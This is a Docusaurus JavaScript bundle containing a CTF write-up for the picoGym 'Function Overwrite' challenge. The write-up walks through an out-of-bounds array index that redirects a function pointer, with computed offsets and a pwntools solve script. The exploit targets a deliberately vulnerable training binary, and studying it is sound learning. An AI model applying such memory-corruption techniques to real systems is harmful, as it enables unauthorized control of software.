"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[8669],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>f});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var c=r.createContext({}),s=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=s(e.components);return r.createElement(c.Provider,{value:n},e.children)},p={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},h=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),h=s(t),f=a,d=h["".concat(c,".").concat(f)]||h[f]||p[f]||o;return t?r.createElement(d,i(i({ref:n},u),{},{components:t})):r.createElement(d,i({ref:n},u))}));function f(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,i=new Array(o);i[0]=h;var l={};for(var c in n)hasOwnProperty.call(n,c)&&(l[c]=n[c]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var s=2;s<o;s++)i[s]=t[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}h.displayName="MDXCreateElement"},7324:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>o,metadata:()=>l,toc:()=>s});var r=t(7462),a=(t(7294),t(3905));const o={slug:"function_overwrite",title:"Function Overwrite",authors:["nguyen"],tags:["Binary Exploitation"]},i=void 0,l={permalink:"/blog/function_overwrite",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-23-function-overwrite.md",source:"@site/blog/2022-05-23-function-overwrite.md",title:"Function Overwrite",description:"Function Overwrite",date:"2022-05-23T00:00:00.000Z",formattedDate:"May 23, 2022",tags:[{label:"Binary Exploitation",permalink:"/blog/tags/binary-exploitation"}],readingTime:2.135,truncated:!0,authors:[{name:"Christopher Nguyen",title:"Reverse Engineer",url:"https://github.com/christopher-nguyen-re",imageURL:"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg",key:"nguyen"}],frontMatter:{slug:"function_overwrite",title:"Function Overwrite",authors:["nguyen"],tags:["Binary Exploitation"]},prevItem:{title:"Guessing Game 1",permalink:"/blog/guessing_game_1"},nextItem:{title:"Got Hax",permalink:"/blog/got_hax"}},c={authorsImageUrls:[void 0]},s=[{value:"The Challenge",id:"the-challenge",level:2},{value:"Analysis",id:"analysis",level:2},{value:"The Solve",id:"the-solve",level:2},{value:"Script",id:"script",level:2}],u={toc:s};function p(e){let{components:n,...o}=e;return(0,a.kt)("wrapper",(0,r.Z)({},u,o,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("p",null,"Function Overwrite"),(0,a.kt)("p",null,"You can point to all kinds of things in C."),(0,a.kt)("p",null,"Hint: Don't be so negative"),(0,a.kt)("h2",{id:"the-challenge"},"The Challenge"),(0,a.kt)("p",null,"Executable can be downloaded ",(0,a.kt)("a",{parentName:"p",href:"/files/function_overwrite/vuln"},"here")," (Right click and open in new tab)."),(0,a.kt)("p",null,"Source code ",(0,a.kt)("a",{target:"_blank",href:t(4322).Z},"here")),(0,a.kt)("p",null,"The goal of this challenge is to get the flag."),(0,a.kt)("h2",{id:"analysis"},"Analysis"),(0,a.kt)("p",null,"The source code was provided so I went ahead and took a look into it to determine insecure code. On line 82, there is an if statement that references an index of an array based on user input. We can use this to access memory outside the bounds of the array. The array is declared right below a function pointer that is set to ",(0,a.kt)("inlineCode",{parentName:"p"},"hard_checker"),"."),(0,a.kt)("h2",{id:"the-solve"},"The Solve"),(0,a.kt)("p",null,"Using GDB, I determined the offset from the array ",(0,a.kt)("inlineCode",{parentName:"p"},"fun")," to the ",(0,a.kt)("inlineCode",{parentName:"p"},"check")," function pointer."),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Addresses",src:t(7231).Z,width:"316",height:"71"})),(0,a.kt)("p",null,"The offset is 0x40 so fun is 64 bytes, or 16 ints, away. In order to modify the value of check to be set to easy_checker, we need to determine the value for ",(0,a.kt)("inlineCode",{parentName:"p"},"num2")," to add to the address of hard_checker."),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Hard check = 0x8049436"),(0,a.kt)("li",{parentName:"ul"},"Easy check = 0x80492fc")),(0,a.kt)("p",null,"0x8049436 - 0x80492fc = 0x13A = 314 bytes"),(0,a.kt)("p",null,"We can set ",(0,a.kt)("inlineCode",{parentName:"p"},"num1")," to -16 and ",(0,a.kt)("inlineCode",{parentName:"p"},"num2")," to -314."),(0,a.kt)("p",null,"For the last piece of the challenge, we need a string where the sum of the values of each character equals ",(0,a.kt)("inlineCode",{parentName:"p"},"1337"),". We have a buffer of up to 127 characters. We can use the highest value character ",(0,a.kt)("inlineCode",{parentName:"p"},"~")," to make as small a string as possible. "),(0,a.kt)("p",null,'"~" = 126'),(0,a.kt)("p",null,"1337 / 126 = 10.61111111111111"),(0,a.kt)("p",null,'We can use 10 "~" which leaves us with 1337 - (10 * 126) = 77'),(0,a.kt)("p",null,'77 = "M"'),(0,a.kt)("p",null,"The string ",(0,a.kt)("inlineCode",{parentName:"p"},"~~~~~~~~~~M")," = 1337"),(0,a.kt)("h2",{id:"script"},"Script"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/env python3\n\n\"\"\"\nToast's submission for the picoGym challenge function overwrite.\n\nThis script can be used in the following manner:\npython3 ./solve.py <REMOTE/LOCAL>\n\nArgs:\n    param1: LOCAL will operate locally on the user's machine.\n            REMOTE will connect to the CTF webserver and grab the flag.\n            If no parameter is specified, the program will default to LOCAL.\n\nReturns:\n    The flag to solve the challenge.\n\"\"\"\n\nfrom pwn import *\n\nexe = ELF(\"./vuln\")\n\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.terminal = ['gnome-terminal', '-e']\n\ndef conn():\n    '''Establish the connection to the process, local or remote.\n    '''\n\n    if args.get('REMOTE'):\n        io = remote('addr', 4141)\n\n    else:\n        io = process([exe.path])\n\n    return io\n\n\ndef main():\n    '''Return the flag.\n    '''\n\n    with conn() as io:\n        flag = get_flag(io)\n        log.success(f\"Flag is: {flag}\")\n\n\ndef get_flag(io):\n    scanf_to_check_offset = -16\n    fun_to_check_offset = -314\n    io.sendline(b'~~~~~~~~~~M')\n    io.recvline()\n    io.sendline(b'-16 -314')\n    io.recvline()\n    flag = io.recvline()\n    return flag.decode()\n\n\nif __name__ == '__main__':\n    main()\n")))}p.isMDXComponent=!0},4322:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/files/vuln-f2a001350c0fdbe9275fac585d72408f.c"},7231:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/check_fun_addrs-a1f4ba8365b98de13a9222e9bb00cce0.png"}}]);